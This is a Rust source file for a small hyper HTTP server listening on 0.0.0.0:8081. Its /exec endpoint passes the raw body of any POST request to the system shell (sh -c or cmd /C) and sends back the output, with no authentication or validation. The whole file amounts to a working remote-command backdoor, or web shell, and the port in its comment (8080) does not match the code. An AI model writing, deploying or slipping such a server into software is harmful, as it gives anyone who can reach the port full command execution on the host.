use hyper::{Body, Request, Response, Server};
use hyper::service::{make_service_fn, service_fn};
use std::process::Command;
use std::convert::Infallible;
use tokio::io::{AsyncWriteExt};

// Function to execute shell commands
async fn execute_command(cmd: &str) -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .arg("/C")
            .arg(cmd)
            .output()
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .output()
    };

    match output {
        Ok(output) => {
            // Convert the output from the command to a String
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr)
        }
        Err(e) => format!("Failed to execute command: {}", e),
    }
}

// Function to handle HTTP requests
async fn handle_request(req: Request<Body>) -> Result<Response<Body>, Infallible> {
    let uri_path = req.uri().path();
    
    // We are expecting a POST request with the command to execute
    if req.method() == hyper::Method::POST && uri_path == "/exec" {
        let whole_body = hyper::body::to_bytes(req.into_body()).await.unwrap();
        let command = String::from_utf8_lossy(&whole_body);
        
        println!("Received command: {}", command);
        
        // Execute the command
        let result = execute_command(&command).await;
        
        // Respond with the result of the command
        Ok(Response::new(Body::from(result)))
    } else {
        // If the request is not to /exec, return a 404 Not Found
        Ok(Response::builder()
            .status(404)
            .body(Body::from("Not Found"))
            .unwrap())
    }
}

#[tokio::main]
async fn main() {
    // Define the address and port for the HTTP listener (binds to all interfaces on port 8080)
    let addr = ([0, 0, 0, 0], 8081).into();

    // Create the service that handles incoming requests
    let make_svc = make_service_fn(|_conn| async {
        Ok::<_, Infallible>(service_fn(handle_request))
    });

    // Start the server
    let server = Server::bind(&addr).serve(make_svc);

    println!("Listening on http://{}", addr);

    // Run the server and await incoming connections
    if let Err(e) = server.await {
        eprintln!("Server error: {}", e);
    }
}

